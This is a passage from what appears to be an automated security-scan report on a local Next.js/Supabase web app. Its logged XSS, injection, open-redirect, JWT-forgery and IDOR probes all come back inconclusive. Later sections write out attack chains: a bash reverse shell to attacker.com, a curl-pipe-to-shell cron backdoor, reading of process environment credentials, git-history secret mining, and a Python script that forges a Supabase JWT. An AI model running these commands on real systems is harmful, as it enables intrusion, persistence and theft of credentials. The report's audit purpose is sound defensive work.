**Response received:**
```http
HTTP 200  (98ms)

GIF89a  �     ���!�    ,       D ;
```

> *Source: app/api/track/[token]/route.ts:21*

### [XSS-01] Reflected XSS: /api/listings/:id/location-insight?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/location-insight?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/listings/1/location-insight?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (31ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200061" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842000...
```

> *Source: app/api/listings/[id]/location-insight/route.ts:9*

### [XSS-01] Reflected XSS: /api/listings/:id/location-insight?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/location-insight?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/listings/1/location-insight?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (29ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200094" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842000...
```

> *Source: app/api/listings/[id]/location-insight/route.ts:9*

### [XSS-01] Reflected XSS: /api/listings/:id/score?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/score?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/listings/1/score?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (31ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200127" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842001...
```

> *Source: app/api/listings/[id]/score/route.ts:10*

### [XSS-01] Reflected XSS: /api/listings/:id/score?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/score?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/listings/1/score?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (30ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200160" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842001...
```

> *Source: app/api/listings/[id]/score/route.ts:10*

### [XSS-01] Reflected XSS: /api/investors?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/investors?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (32ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200194" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842001...
```

> *Source: app/api/investors/route.ts:6*

### [XSS-01] Reflected XSS: /api/investors?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/investors?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (41ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200241" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842002...
```

> *Source: app/api/investors/route.ts:6*

### [XSS-01] Reflected XSS: /api/investors/:id?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/investors/1?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (30ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200276" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842002...
```

> *Source: app/api/investors/[id]/route.ts:10*

### [XSS-01] Reflected XSS: /api/investors/:id?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/investors/1?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (32ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200311" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842003...
```

> *Source: app/api/investors/[id]/route.ts:10*

### [XSS-01] Reflected XSS: /api/investors/:id/matches?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1/matches?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/investors/1/matches?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (28ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200343" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842003...
```

> *Source: app/api/investors/[id]/matches/route.ts:10*

### [XSS-01] Reflected XSS: /api/investors/:id/matches?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1/matches?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/investors/1/matches?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (27ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384200373" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793842003...
```

> *Source: app/api/investors/[id]/matches/route.ts:10*

### [SQLI-01] SQLi error probe: GET /temperatures?roomId='
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/temperatures?roomId=%27`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /temperatures?roomId=%27
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login?roomId=%27
```

### [SQLI-01] SQLi error probe: GET /temperatures/:roomId?roomId='
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/temperatures/:roomId?roomId=%27`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /temperatures/:roomId?roomId=%27
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login?roomId=%27
```

### [NOSQL-01] NoSQL injection: POST /login
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/login`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /login

{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

### [REDIR-01] Open redirect: /login?redirect=<evil>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/login?redirect=https%3A//evil-attacker.com`  
**Evidence:** HTTP 307 Location:  — redirect, but to different destination  

**Request sent:**
```http
GET /login?redirect=https%3A//evil-attacker.com
```

**Response received:**
```http
HTTP 307  (3ms)
Location: 

/auth/login?redirect=https%3A%2F%2Fevil-attacker.com
```

### [JWT-FORGE-01] Supabase JWT forge (cookie): POST /api/location-insights
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/location-insights`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/location-insights
Cookie: sb-example-auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwM...
```

**Response received:**
```http
HTTP 307  (5ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-02] Supabase JWT forge (Bearer): POST /api/location-insights
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/location-insights`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/location-insights
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwMDAtMDAwMC0wMDAw...
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-01] Supabase JWT forge (cookie): GET /api/location-insights/:id
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights/1`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/location-insights/1
Cookie: sb-example-auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwM...
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-02] Supabase JWT forge (Bearer): GET /api/location-insights/:id
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights/1`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/location-insights/1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwMDAtMDAwMC0wMDAw...
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-01] Supabase JWT forge (cookie): GET /api/listings/:id/location-insight
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/location-insight`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/listings/1/location-insight
Cookie: sb-example-auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwM...
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-02] Supabase JWT forge (Bearer): GET /api/listings/:id/location-insight
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/location-insight`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/listings/1/location-insight
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwMDAtMDAwMC0wMDAw...
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-01] Supabase JWT forge (cookie): GET /api/listings/:id/score
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/listings/1/score
Cookie: sb-example-auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwM...
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-02] Supabase JWT forge (Bearer): GET /api/listings/:id/score
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/listings/1/score
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwMDAtMDAwMC0wMDAw...
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-01] Supabase JWT forge (cookie): POST /api/listings/:id/score
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/listings/1/score
Cookie: sb-example-auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwM...
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [JWT-FORGE-02] Supabase JWT forge (Bearer): POST /api/listings/:id/score
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/listings/1/score
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMDAwMDAwMDAtMDAwMC0wMDAw...
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Project ref: example | Cookie name: sb-example-auth-token*

### [IDOR-01] IDOR: GET /api/location-insights/:id (unauthenticated)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights/1`  
**Evidence:** ID=1: HTTP 307, ID=2: HTTP 307, ID=999: HTTP 307  

**Request sent:**
```http
GET /api/location-insights/1
```

**Response received:**
```http
HTTP 307  (5ms)

/auth/login
```

> *Source: app/api/location-insights/[id]/route.ts:9*

### [IDOR-01] IDOR: GET /api/listings/:id/location-insight (unauthenticated)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/location-insight`  
**Evidence:** ID=1: HTTP 307, ID=2: HTTP 307, ID=999: HTTP 307  

**Request sent:**
```http
GET /api/listings/1/location-insight
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/listings/[id]/location-insight/route.ts:9*

### [IDOR-01] IDOR: GET /api/listings/:id/score (unauthenticated)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** ID=1: HTTP 307, ID=2: HTTP 307, ID=999: HTTP 307  

**Request sent:**
```http
GET /api/listings/1/score
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/listings/[id]/score/route.ts:10*

### [IDOR-01] IDOR: GET /api/investors/:id (unauthenticated)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1`  
**Evidence:** ID=1: HTTP 307, ID=2: HTTP 307, ID=999: HTTP 307  

**Request sent:**
```http
GET /api/investors/1
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/investors/[id]/route.ts:10*

### [IDOR-01] IDOR: GET /api/investors/:id/matches (unauthenticated)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1/matches`  
**Evidence:** ID=1: HTTP 307, ID=2: HTTP 307, ID=999: HTTP 307  

**Request sent:**
```http
GET /api/investors/1/matches
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/investors/[id]/matches/route.ts:10*

### [XSS-SINK-01] XSS sink form: POST /app (from /app)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/app`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /app

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /app/html (from /app/html)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/app/html`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /app/html

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /app/script (from /app/script)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/app/script`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /app/script

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /dashboard/script (from /dashboard/script)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/dashboard/script`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /dashboard/script

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /app/animations (from /app/animations)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/app/animations`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /app/animations

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /dashboard (from /dashboard)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/dashboard`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /dashboard

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (5ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST / (from /)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /home (from /home)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/home`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /home

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /dashboard/html (from /dashboard/html)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/dashboard/html`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /dashboard/html

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

### [XSS-SINK-01] XSS sink form: POST /dashboard/animations (from /dashboard/animations)
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/dashboard/animations`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /dashboard/animations

{"email": "<secmaxxing-xss-sink-probe>", "password": "<secmaxxing-xss-sink-probe>"}
```

**Response received:**
```http
HTTP 307  (5ms)

/auth/login
```

> *Sinks at: DMDI/webshop/public/js/utils/html.js:11, Gainx/makita-store/js/animations.js:302, Gainx/makita-store/js/animations.js:398*

---

## Critical Attack Chains

> Multi-step exploitation paths. Static analysis — confirm with live tests.

### 1. XSS → Session Hijacking → Full Account Takeover
**Severity:** 🔴 CRITICAL  
**References:** [S013]

**Steps:**
1. Inject XSS payload via user-controlled input rendered at `DMDI/webshop/public/js/utils/html.js:11`  
2. Victim views page — payload fires silently in their browser  
3. Payload exfiltrates `document.cookie` / localStorage auth token to attacker server  
4. Attacker replays stolen token — authenticated as victim  
5. If victim is admin: full application admin takeover  

**Final Impact:** Complete account takeover for any user viewing the affected page

### 2. RCE → Reverse Shell → Persistence → Internal Network Pivot
**Severity:** 🔴 CRITICAL  
**References:** [S033]

**Steps:**
1. Trigger RCE at `components/deals/activity-log-section.tsx:36`  
2. Execute: `bash -i >& /dev/tcp/attacker.com/4444 0>&1` — interactive reverse shell  
3. `cat /proc/*/environ 2>/dev/null` — harvest all env vars from all processes  
4. Extract DB credentials → direct database access, bypass all app logic  
5. Add cron: `* * * * * curl https://attacker.com/c2 | sh` — persistent backdoor  
6. Scan internal: `for i in $(seq 1 254); do ping -c1 10.0.0.$i; done` — pivot to internal network  

**Final Impact:** Full server compromise, persistence, internal network pivot

### 3. Git History Mining → Permanent Secret Exposure
**Severity:** 🔴 CRITICAL  
**References:** [S003g], [S003f], [S003g]

**Steps:**
1. Clone repo (public) or access source via any code-read vector  
2. `git log --all -p | grep -E 'AKIA|sk-|ghp_|password'` — all historical secrets  
3. Secrets persist in git history even after removal from latest commit  
4. Use each secret: API abuse, DB access, lateral movement, billing drain  
5. Secrets may have been valid for months/years — no rotation triggered  

**Final Impact:** Permanent access to all historical secrets, potentially live in multiple environments

---

## Privilege Escalation Paths

### IDOR — Insecure Direct Object Reference
**Entry Point:** Any authenticated user  
**Final Access:** Read, modify, or delete any user's data in the affected resource

**Steps:**
1. Find endpoint accepting user_id / record_id as URL param or body field  
2. Replace your own ID with any other user's ID in the request  
3. No server-side ownership check → read/modify victim's data  
4. Enumerate IDs (sequential ints or UUID timing oracle) to access all records  

**Evidence in codebase:**
- `DMDI/webshop/src/controllers/admin-clients.controller.ts:44 — `const client = await approveClient(String(req.params.id));``
- `DMDI/webshop/src/controllers/admin-clients.controller.ts:53 — `const client = await rejectClient(String(req.params.id));``
- `DMDI/webshop/src/controllers/admin-clients.controller.ts:62 — `const result = await createPasswordResetLinkForUser(String(req.params.id), req.user!);``
- `DMDI/webshop/src/controllers/admin-clients.controller.ts:71 — `const user = await updateManagedUserAccess(String(req.params.id), req.body, req.user!);``
- `DMDI/webshop/src/controllers/admin-clients.controller.ts:80 — `const result = await deleteManagedUser(String(req.params.id), req.user!);``

---

## Static Exploit PoCs

> Payloads for each detected vulnerability pattern.

### [S018] Supabase getSession() on server
**Type:** Auth Bypass via getSession() JWT Trust  
**Severity:** 🔴 CRITICAL  
**Location:** `realtools-cli/src/client.ts:58`  
**Privilege Gain:** `unauth → any_user_or_admin`

`getSession()` at `realtools-cli/src/client.ts:58` reads the JWT from the client cookie and trusts its claims without calling Supabase's auth server to verify. Attacker crafts a JWT with any `sub` (user ID) or custom role claim. All server-side auth checks that use this session are bypassed. Attacker impersonates any user, including admins.

**Payload:**
```
# Project ref detected: example
# Cookie name: sb-example-auth-token
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=').decode()
payload = {"sub": "00000000-0000-0000-0000-000000000001",
           "role": "authenticated", "user_metadata": {"role": "admin"},
           "app_metadata": {"role": "admin"}, "exp": 9999999999}
enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f'{header}.{enc}.invalid_signature'
# curl: -H 'Cookie: sb-example-auth-token=<forged>'
```

**Example:**
```bash
# getSession() at realtools-cli/src/client.ts:58 trusts client JWT without server verification
curl /api/admin-endpoint \
  -H 'Cookie: sb-example-auth-token=<forged_jwt>'
```

**Impact:** Impersonate any user, bypass all authorization, full admin takeover

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `tests/fixtures/score-card-e2e.ts:28`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `tests/fixtures/score-card-e2e.ts:28` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at tests/fixtures/score-card-e2e.ts:28
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/prisma/seed-demo-users.ts:13`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/prisma/seed-demo-users.ts:13` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/prisma/seed-demo-users.ts:13
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
# Mine all history:
git log --all -p | grep -E 'AKIA|sk-|ghp_|service_role|password\s*='
```

**Impact:** Full access to the corresponding service — data read/write, billing abuse, lateral movement

### [S003f] Hardcoded password
**Type:** Hardcoded/Exposed Secret Extraction  
**Severity:** 🔴 CRITICAL  
**Location:** `DMDI/webshop/tests/auth.test.ts:66`  
**Privilege Gain:** `code_reader → service_admin`

Credential at `DMDI/webshop/tests/auth.test.ts:66` visible in source to any repo reader. In public repos: immediately exposed to entire internet. Even after code removal: persists in git history forever unless force-purged. Attacker uses key for API abuse, data theft, billing drain, or lateral movement to other services.

**Payload:**
```
# Extract from source at DMDI/webshop/tests/auth.test.ts:66
git clone <repo> && git log --all -p | grep -E 'sk-|AKIA|ghp_|password\s*='
# Even after removal — still in git history
# For NEXT_PUBLIC_: curl https://your-app.com/_next/static/chunks/*.js | grep -oE 'sk-[a-zA-Z0-9]+'
```

**Example:**
```bash
# If public repo: secret already globally exposed
